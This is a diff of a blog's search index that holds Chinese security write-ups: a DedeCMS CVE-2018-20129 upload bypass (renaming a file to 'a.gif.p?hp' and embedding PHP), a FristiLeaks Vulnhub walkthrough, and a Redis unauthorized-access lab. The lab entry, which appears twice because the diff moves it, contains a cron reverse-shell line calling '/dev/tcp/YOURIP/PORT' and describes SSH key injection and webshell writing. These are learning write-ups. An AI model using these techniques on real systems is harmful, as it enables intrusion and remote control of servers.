@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[phpMyAdmin 4.8.0~4.8.3 任意文件包含/远程代码执行漏洞 (CVE-2018-19968)]]></title>
+    <url>%2F2019%2F02%2F11%2FCVE-2018-19968%2F</url>
+    <content type="text"><![CDATA[不知不觉就咸鱼了一周(发出了断九幺的声音)，复现了下CVE-2018-19968，顺便分析下源码]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CVE-2018-20129 织梦V5.7 SP2前台鸡肋文件上传getshell]]></title>
     <url>%2F2019%2F02%2F03%2FCVE-2018-20129%20DedeCMS%20V5.7%20SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%2F</url>
     <content type="text"><![CDATA[抱大佬大腿的第一天，今日要做的事情是复现下CVE-2018-20129，也就是DedeCMS V5.7SP2 的一处通过文件上传get shell 介绍此漏洞限制很大。 需要管理员权限 需要开启会员功能也就是说虽然是前台getshell但是需要有后台权限 详情漏洞产生于/include/dialog/select_images_post.php12require_once(dirname(__FILE__)."/config.php");require_once(dirname(__FILE__)."/../image.func.php"); 看下config.php 123456789101112131415//检验用户登录状态$cuserLogin = new userLogin();if($cuserLogin-&gt;getUserID() &lt;=0 )&#123; if(empty($adminDirHand)) &#123; ShowMsg("&lt;b&gt;提示：需输入后台管理目录才能登录&lt;/b&gt;&lt;br /&gt;&lt;form&gt;请输入后台管理目录名：&lt;input type='hidden' name='gotopage' value='".urlencode($dedeNowurl)."' /&gt;&lt;input type='text' name='adminDirHand' value='dede' style='width:120px;' /&gt;&lt;input style='width:80px;' type='submit' name='sbt' value='转入登录' /&gt;&lt;/form&gt;", "javascript:;"); exit(); &#125; $adminDirHand = HtmlReplace($adminDirHand, 1); $gurl = "../../&#123;$adminDirHand&#125;/login.php?gotopage=".urlencode($dedeNowurl); echo "&lt;script language='javascript'&gt;location='$gurl';&lt;/script&gt;"; exit();&#125; 会先检验用户登录状态，必须要是后台管理员 同时config.php1require_once(dirname(__FILE__)."/../common.inc.php"); 而common.inc.php12345//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数if($_FILES)&#123; require_once(DEDEINC.'/uploadsafe.inc.php');&#125; uploadsafe.inc.php中含有用来处理文件相关的函数12345678910$cfg_not_allowall = "php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml";............if(!empty($&#123;$_key.'_name'&#125;) &amp;&amp; (preg_match("#\.(".$cfg_not_allowall.")$#i",$&#123;$_key.'_name'&#125;) || !preg_match("#\.#", $&#123;$_key.'_name'&#125;)) )&#123; if(!defined('DEDEADMIN')) &#123; exit('Not Admin Upload filetype not allow !'); &#125;&#125; 上传的文件的后缀名不能是$cfg_not_allowall中的这些 123456$imgfile_name = trim(preg_replace("#[ \r\n\t\*\%\\\/\?&gt;&lt;\|\":]&#123;1,&#125;#", '', $imgfile_name));if(!preg_match("#\.(".$cfg_imgtype.")#i", $imgfile_name))&#123; ShowMsg("你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！", "-1"); exit();&#125; 这段代码表示$imgfile_name的一些特殊符号会先被去掉,在限制了php的情况下可以使用p?hp之类的后缀进行绕过，并且$imgfile_name中必须有.jpg,.png之类的 1234567$sparr = Array("image/pjpeg", "image/jpeg", "image/gif", "image/png", "image/xpng", "image/wbmp");$imgfile_type = strtolower(trim($imgfile_type));if(!in_array($imgfile_type, $sparr))&#123; ShowMsg("上传的图片格式错误，请使用JPEG、GIF、PNG、WBMP格式的其中一种！","-1"); exit();&#125; 这段代码表示Content-Type必须是$sparr中的类型 如果网站配置AddType application/x-httpd-php .phtml之类的可以采用.phtml绕过后缀名限制 因为? &lt; &gt; 等字符会被过滤，所以也可以以使用.p?hp的形式绕过 复现首先在后台打开会员功能，同时把注册审核给关了，方便注册然后注册一个新账号，进入发表文章界面点击下方的按钮后选择上传修改后缀名为a.gif.p?hp,同时讲图片内容中加上&lt;?php phpinfo();?&gt;进行访问 修复 关闭会员功能 采用白名单 改进扩展名判断]]></content>
@@ -225,18 +237,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[redis未授权访问]]></title>
-    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
-    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>redis</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[Vulnhub FristiLeaks]]></title>
     <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
     <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
@@ -246,6 +246,18 @@
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[redis未授权访问]]></title>
+    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
+    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
